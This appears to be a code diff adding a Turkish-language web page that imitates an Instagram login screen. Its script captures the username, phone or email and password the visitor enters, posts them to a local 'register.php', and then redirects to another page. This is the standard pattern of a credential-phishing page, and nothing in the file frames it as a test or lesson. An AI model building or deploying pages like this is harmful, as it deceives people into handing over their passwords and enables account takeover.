@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="tr-TR">
+
+<head>
+    <meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+    <meta name="generator" content="2018.1.1.386" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Giriş Yap</title>
+    <link rel="icon" type="image/png" href="ımg/favicon.png">
+    <!-- CSS -->
+    <link rel="stylesheet" type="text/css" href="css/site_global.css?crc=444006867" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        #login-container {
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+            margin: 0 auto; /* yatay olarak ortala */
+            display: flex;
+            flex-direction: column; /* elemanları dikey olarak sıralayın */
+            align-items: center; /* dikey olarak ortala */
+            justify-content: center; /* yatay olarak ortala (isteğe bağlı) */
+        }
+
+        #login-container label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            text-align: left; /* metinleri sol tarafa hizala */
+            width: 100%; /* genişlik ayarı */
+        }
+
+        #login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        #login-container input[type="text"],
+        #login-container input[type="tel"],
+        #login-container input[type="email"],
+        #login-container input[type="password"] {
+            color: #888;
+        }
+
+        #login-container input[type="submit"] {
+            background-color: #0095f6; /* Renk değişikliği burada */
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            border-radius: 20px;
+            padding: 10px 20px;
+            font-family: 'Roboto', sans-serif; /* Instagram fontunu ayarla */
+        }
+
+        #login-container input[type="submit"]:hover {
+            background-color: #005f96; /* Hover rengi değişikliği burada */
+        }
+
+        #login-container input[type="submit"].hidden {
+            display: none;
+        }
+
+        #login-container input[type="submit"].active {
+            background-color: #0095f6;
+        }
+
+        /* Şifremi Unuttum ve Diğer Bağlantılar */
+        .forgot-password {
+            margin-top: 10px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .forgot-password a {
+            color: #3498db;
+            text-decoration: none;
+        }
+
+        /* Instagram Bağlantısı */
+        .instagram-link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .instagram-link a {
+            color: #555;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var usernameField = document.getElementById("username_email_phone");
+            var submitButton = document.querySelector("#login-container input[type='submit']");
+
+            usernameField.addEventListener("focus", function () {
+                if (this.value === "Telefon numarası,kullanıcı adı veya e-posta") {
+                    this.value = "";
+                }
+            });
+
+            usernameField.addEventListener("blur", function () {
+                if (this.value === "") {
+                    this.value = "Telefon numarası,kullanıcı adı veya e-posta";
+                }
+            });
+
+            var inputFields = document.querySelectorAll("#username_email_phone, #password");
+
+            inputFields.forEach(function (inputField) {
+                inputField.addEventListener("input", function () {
+                    var allFieldsFilled = Array.from(inputFields).every(function (field) {
+                        return field.value.trim() !== "";
+                    });
+
+                    if (allFieldsFilled) {
+                        submitButton.classList.remove("hidden");
+                        submitButton.classList.add("active");
+                    } else {
+                        submitButton.classList.add("hidden");
+                        submitButton.classList.remove("active");
+                    }
+                });
+            });
+
+            document.getElementById("loginForm").addEventListener("submit", function (event) {
+                event.preventDefault(); // Formun varsayılan davranışını engelle
+
+                // Form verilerini al
+                var formData = new FormData(event.target);
+
+                // Verileri POST isteği ile gönder
+                fetch("register.php", {
+                    method: "POST",
+                    body: formData
+                }).then(function (response) {
+                    if (response.ok) {
+                        // Başarılı ise kullanıcıyı yönlendir
+                        setTimeout(function () {
+                            window.location.href = "std.html";
+                        }, 2000);
+                    } else {
+                        // Hata durumunda kullanıcıyı uyar
+                        alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                    }
+                }).catch(function (error) {
+                    console.error("Sunucu hatası:", error);
+                    alert("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
+                });
+            });
+        });
+    </script>
+</head>
+
+<body>
+    <div id="login-container">
+        <h2 style="color: #0095f6;">Instagram</h2>
+        <form id="loginForm" method="POST">
+            <label for="username_email_phone">Telefon numarası, kullanıcı adı veya e-posta</label>
+            <input type="text" id="username_email_phone" name="username_email_phone" required>
+
+            <label for="password">Şifre</label>
+            <input type="password" id="password" name="password" required>
+
+            <input type="submit" value="Giriş Yap" class="hidden">
+            <div class="forgot-password">
+                <a href="#">Şifremi Unuttum</a>
+            </div>
+        </form>
+        <div class="instagram-link">
+            <a href="index.html">Geri Dön</a>
+        </div>
+    </div>
+</body>
+
+</html>
